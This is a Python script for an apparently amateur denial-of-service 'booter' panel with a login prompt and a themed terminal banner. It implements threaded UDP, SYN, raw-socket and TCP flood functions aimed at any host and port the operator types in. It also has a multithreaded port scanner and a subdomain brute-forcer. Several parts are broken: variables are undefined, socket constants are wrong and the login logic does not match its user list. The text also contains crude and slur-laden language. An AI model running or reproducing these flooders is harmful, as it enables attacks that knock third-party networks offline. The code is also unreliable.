#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\x07")
def modifications():
	print ("Contact Sinfull or Pimpin Go Fuck Ur Self Currently Under Maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
home = """\033[m
╔══════════════════════════════════════════════════════╗
║            \033[90m Home METHODS\033[90m             ║               
║══════════════════════════════════════════════════════║
║ \033[90mUDP   (IP) (PORT) (TIME) (65000)  \033[90m|\033[90m UDP ATTACK\033[90m    ║
║ \033[90mNTP  (IP) (PORT) (TIME) (65000)  \033[90m|\033[90m HOME ATTACK\033[90m   ║
║ \033[90mCHARGE (IP) (PORT) (TIME) (65000)  \033[90m|\033[90m HOME ATTACK\033[90m   ║
║ \033[90mDNS (IP) (PORT) (TIME) (65000)  \033[90m|\033[90m HOME ATTACK\033[90m   ║
║ \033[90mRIP (IP) (PORT) (TIME) (65000)  \033[90m|\033[90m HOME ATTACK \033[90m   ║
╚══════════════════════════════════════════════════════╝\033[90m
\033[90mHave Fun @ℙ 𝕚 𝕞 𝕡 𝕀 𝕟
"""

banner = """\033[1;00m

█▀█   █   █▀▄▀█   █▀█   █   █▄░█ ℙ 𝕚 𝕞 𝕡 𝕀 𝕟
█▀▀   █   █░▀░█   █▀▀   █   █░▀█ ℙ 𝕚 𝕞 𝕡 𝕀 𝕟 
🇵​​​​​ 🇮​​​​​ 🇲​​​​​ 🇵​​​​​ 🇮​​​​​ 🇳​​​​​                      
SkidRiped Pimpin
Sinfull.c Remake                       
"""


cookie = open(".ℙ 𝕚 𝕞_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;Server (0) | Bot (0) | Owner @ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\x07")
		sin = input("\033[1;00m[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[1;00m]-\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("sinful version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
			print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
			main()
		elif sinput == "methods":
			print (home)
			main()
		elif sinput == "method":
			print (home)
			main()
		elif sinput == "tools133":
			print (tools)
			main()
		elif sinput == "portscan124":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mSIN\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "infoer123":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mSIN\033[00m] UDP Running processes: {}".format (uaid))
			print ("[\033[91mSIN\033[00m] NTP Running processes: {}".format (iaid))
			print ("[\033[91mSIN\033[00m] RIP Running processes: {}".format (said))
			print ("[\033[91mSIN\033[00m] Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve1231234":
			sfound = 0
			sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[91mSIN\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[91mSIN\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91mSIN\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolveer12331333":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "pinger12233333333333333333333333333":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mSIN\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\x07".format (stop))
						print ("Sinfull: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\x07")
						print ("Sinfull: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "home":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "essyn":
			if username == "guests":
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "zap":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90mℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mSIN\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[91m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] {} Not a command".format(sinput))
			main()



try:
	users = ["Pim", "guests"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (Enter Username): ")
	if username in users:
		user = username
	else:
		print ("Login Incorrect")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["Pimpin", "gayman"]
	password = getpass.getpass ("[+] Password (Enter Password): ")
	if user == "Ace":
		if password == passwords[0]:
			print ("Login Successful")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[90m@ℙ 𝕚 𝕞 𝕡 𝕀 𝕟\033[00m] CTRL has been pressed")
				main()
		else:
			print ("Login Incorrect")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()